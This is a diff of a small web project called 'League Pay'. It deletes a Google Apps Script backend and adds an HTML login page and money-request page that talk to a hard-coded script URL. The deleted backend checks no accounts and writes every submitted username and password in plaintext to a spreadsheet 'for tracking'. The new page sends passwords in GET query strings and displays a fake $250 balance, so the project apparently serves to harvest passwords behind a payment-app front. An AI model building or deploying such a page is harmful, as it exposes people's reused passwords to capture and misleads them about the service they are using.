@@ -1,77 +1,278 @@
-function doGet(e) {
-  return handle(e);
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>League Pay</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0f172a;
+      color: #f1f5f9;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .container {
+      background: #1e293b;
+      border-radius: 20px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+    }
+    h1 { font-size: 1.6rem; margin-bottom: 4px; }
+    .subtitle { color: #94a3b8; margin-bottom: 24px; font-size: 0.95rem; }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 14px;
+      border-radius: 10px;
+      border: none;
+      background: #0f172a;
+      color: #f1f5f9;
+      font-size: 1rem;
+    }
+    input::placeholder { color: #64748b; }
+    .error { color: #f87171; font-size: 0.9rem; margin-bottom: 12px; display: none; }
+    .loading { color: #94a3b8; font-size: 0.9rem; margin-bottom: 12px; display: none; }
+    .success { color: #4ade80; font-size: 0.9rem; margin-bottom: 12px; display: none; text-align: center; }
+    button {
+      width: 100%;
+      padding: 16px;
+      background: #38bdf8;
+      color: #0f172a;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+    button:disabled { background: #334155; color: #64748b; cursor: not-allowed; }
+    .hidden { display: none; }
+    .balance-card, .preview-card {
+      background: #0f172a;
+      border-radius: 14px;
+      padding: 18px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    .label { font-size: 0.85rem; color: #94a3b8; margin-bottom: 6px; }
+    .balance { font-size: 1.9rem; font-weight: 700; color: #38bdf8; }
+    .preview { color: #4ade80; }
+    .slider-section { margin-bottom: 28px; }
+    .slider-section label { display: block; margin-bottom: 12px; font-weight: 500; }
+    .amount-display {
+      text-align: center;
+      font-size: 2.4rem;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: #fbbf24;
+    }
+    input[type="range"] {
+      width: 100%;
+      height: 8px;
+      -webkit-appearance: none;
+      appearance: none;
+      background: #334155;
+      border-radius: 8px;
+      outline: none;
+      margin-bottom: 0;
+    }
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 26px;
+      height: 26px;
+      background: #38bdf8;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+    .slider-labels {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.8rem;
+      color: #64748b;
+      margin-top: 8px;
+    }
+    .user-info {
+      text-align: center;
+      color: #94a3b8;
+      font-size: 0.9rem;
+      margin-bottom: 20px;
+    }
+    .logout {
+      background: transparent;
+      color: #94a3b8;
+      font-size: 0.9rem;
+      margin-top: 8px;
+      padding: 8px;
+    }
+  </style>
+</head>
+<body>
 
-function doPost(e) {
-  return handle(e);
-}
+  <!-- LOGIN SCREEN -->
+  <div class="container" id="authScreen">
+    <h1>League Pay</h1>
+    <p class="subtitle">Enter your name and a password</p>
 
-function handle(e) {
-  const result = { success: false, message: "Unknown error" };
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password (min 6 chars + 1 number)">
+    
+    <p class="error" id="errorMsg"></p>
+    <p class="loading" id="loadingMsg">Checking...</p>
 
-  try {
-    const params = e.parameter;
-    const action = params.action;
-    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
+    <button id="enterBtn">Continue</button>
+  </div>
 
-    // ========== ENTER / TRACK USER ==========
-    if (action === "enter") {
-      const username = (params.username || "").toString().toLowerCase().trim();
-      const password = (params.password || "").toString();
+  <!-- MAIN APP -->
+  <div class="container hidden" id="appScreen">
+    <h1>Request Money</h1>
+    <p class="subtitle">After the game</p>
+    
+    <div class="user-info">
+      Logged in as <strong id="currentUser"></strong>
+    </div>
+
+    <div class="balance-card">
+      <p class="label">Their current balance</p>
+      <p class="balance">$250.00</p>
+    </div>
+
+    <div class="slider-section">
+      <label for="amountSlider">How much do you want?</label>
+      <div class="amount-display">
+        $<span id="requestedAmount">0</span>
+      </div>
+      <input type="range" id="amountSlider" min="0" max="250" value="0" step="5">
+      <div class="slider-labels">
+        <span>$0</span>
+        <span>$250</span>
+      </div>
+    </div>
+
+    <div class="preview-card">
+      <p class="label">Their balance after transfer</p>
+      <p class="balance preview" id="newBalance">$250.00</p>
+    </div>
+
+    <button id="requestBtn" disabled>Request Money</button>
+    <p class="loading" id="requestLoading" style="text-align:center;">Saving...</p>
+    <p class="success" id="requestSuccess">Request saved to sheet!</p>
+    <button class="logout" id="logoutBtn">Log out</button>
+  </div>
+
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwuRHd7RWa1ch4mC7ZDC3sI2vp4k6iqRi3jB8mqrXFO5z0SOR8mqDhjQQ00P14Mxcga/exec";
+
+    const authScreen = document.getElementById('authScreen');
+    const appScreen = document.getElementById('appScreen');
+
+    function hideMessages() {
+      document.querySelectorAll('.error, .loading, .success').forEach(el => el.style.display = 'none');
+    }
+
+    // ENTER (no pre-existing account needed)
+    document.getElementById('enterBtn').onclick = async () => {
+      const username = document.getElementById('username').value.trim().toLowerCase();
+      const password = document.getElementById('password').value;
+
+      hideMessages();
 
       if (!username || !password) {
-        result.message = "Please enter username and password";
-        return json(result);
+        document.getElementById('errorMsg').textContent = "Please fill in both fields";
+        document.getElementById('errorMsg').style.display = 'block';
+        return;
       }
 
-      // Standard password requirements
-      if (password.length < 6) {
-        result.message = "Password must be at least 6 characters";
-        return json(result);
-      }
-      if (!/\d/.test(password)) {
-        result.message = "Password must contain at least one number";
-        return json(result);
-      }
+      document.getElementById('loadingMsg').style.display = 'block';
 
-      // Just save whatever they put (for tracking)
-      const date = new Date().toLocaleString();
-      sheet.appendRow([username, password, "", date, "login"]);
+      try {
+        const url = `${SCRIPT_URL}?action=enter&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+        const res = await fetch(url);
+        const data = await res.json();
 
-      result.success = true;
-      result.message = "Logged in";
-      return json(result);
+        document.getElementById('loadingMsg').style.display = 'none';
+
+        if (data.success) {
+          localStorage.setItem('loggedInUser', username);
+          showApp(username);
+        } else {
+          document.getElementById('errorMsg').textContent = data.message;
+          document.getElementById('errorMsg').style.display = 'block';
+        }
+      } catch (err) {
+        document.getElementById('loadingMsg').style.display = 'none';
+        document.getElementById('errorMsg').textContent = "Connection error";
+        document.getElementById('errorMsg').style.display = 'block';
+      }
+    };
+
+    // REQUEST MONEY
+    document.getElementById('requestBtn').onclick = async () => {
+      const amount = document.getElementById('amountSlider').value;
+      const user = localStorage.getItem('loggedInUser');
+
+      hideMessages();
+      document.getElementById('requestLoading').style.display = 'block';
+
+      try {
+        const url = `${SCRIPT_URL}?action=request&username=${encodeURIComponent(user)}&amount=${encodeURIComponent(amount)}`;
+        const res = await fetch(url);
+        const data = await res.json();
+
+        document.getElementById('requestLoading').style.display = 'none';
+
+        if (data.success) {
+          document.getElementById('requestSuccess').style.display = 'block';
+        } else {
+          alert(data.message);
+        }
+      } catch (err) {
+        document.getElementById('requestLoading').style.display = 'none';
+        alert("Connection error");
+      }
+    };
+
+    // LOGOUT
+    document.getElementById('logoutBtn').onclick = () => {
+      localStorage.removeItem('loggedInUser');
+      appScreen.classList.add('hidden');
+      authScreen.classList.remove('hidden');
+      document.getElementById('username').value = '';
+      document.getElementById('password').value = '';
+      hideMessages();
+    };
+
+    function showApp(username) {
+      authScreen.classList.add('hidden');
+      appScreen.classList.remove('hidden');
+      document.getElementById('currentUser').textContent = username;
+      updateUI();
     }
 
-    // ========== REQUEST MONEY ==========
-    if (action === "request") {
-      const username = (params.username || "").toString().toLowerCase().trim();
-      const amount = params.amount || "0";
+    // Auto login
+    const savedUser = localStorage.getItem('loggedInUser');
+    if (savedUser) showApp(savedUser);
 
-      if (!username) {
-        result.message = "No user";
-        return json(result);
-      }
+    // SLIDER
+    const slider = document.getElementById('amountSlider');
+    const requestedAmountEl = document.getElementById('requestedAmount');
+    const newBalanceEl = document.getElementById('newBalance');
+    const requestBtn = document.getElementById('requestBtn');
 
-      const date = new Date().toLocaleString();
-      sheet.appendRow([username, "", amount, date, "request"]);
-
-      result.success = true;
-      result.message = "Request saved";
-      return json(result);
+    function updateUI() {
+      const amount = parseInt(slider.value);
+      requestedAmountEl.textContent = amount;
+      newBalanceEl.textContent = `$${(250 - amount).toFixed(2)}`;
+      requestBtn.disabled = amount === 0;
     }
 
-    result.message = "Unknown action";
-    return json(result);
-
-  } catch (err) {
-    result.message = err.toString();
-    return json(result);
-  }
-}
-
-function json(obj) {
-  return ContentService
-    .createTextOutput(JSON.stringify(obj))
-    .setMimeType(ContentService.MimeType.JSON);
-}
+    slider.addEventListener('input', updateUI);
+  </script>
+</body>
+</html>
